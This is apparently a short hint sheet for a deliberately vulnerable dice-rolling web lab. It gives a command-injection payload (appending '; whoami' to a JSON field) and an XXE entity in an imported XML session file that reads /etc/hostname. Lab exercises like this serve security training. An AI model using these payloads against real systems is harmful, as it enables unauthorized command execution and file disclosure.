* Hint : **RCE** - Lab variant: `dice-001`

  * `/api/roll` Roll any Dice;
  * {"dice":[{"type":"d4","count":1}],`"rollOptions":"none"`}
    ```text
    "rollOptions":"none; whoami"
    ```


* Hint : **Import your previous sessions.** - Lab variant: `dice-005`

  * Create a room then export xml
  * Edit xml file and import
    ```text
    <?xml version="1.0"?> 
    <!DOCTYPE session [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
    <session><name>&xxe; Flag</name><rolls><roll><player>user</player><notation>1d4 + 1d100</notation><total>68</total></roll></rolls></session>
    ```
